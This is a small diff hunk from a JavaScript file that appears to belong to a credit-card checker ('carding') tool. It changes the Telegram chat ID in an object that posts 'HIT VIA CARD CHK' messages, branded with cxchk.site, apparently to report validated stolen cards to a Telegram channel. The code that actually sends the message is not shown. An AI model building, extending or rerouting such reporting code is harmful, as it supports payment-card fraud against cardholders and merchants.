@@ -250,7 +250,7 @@ document.addEventListener('DOMContentLoaded', function() {
                                   `[⌇] 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ 𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲 (https://cxchk.site)`;
             
             const simpleTelegramData = {
-                chat_id: '-1003044358879',
+                chat_id: '-1002554243871',
                 text: simpleMessage,
                 parse_mode: 'Markdown'
             };
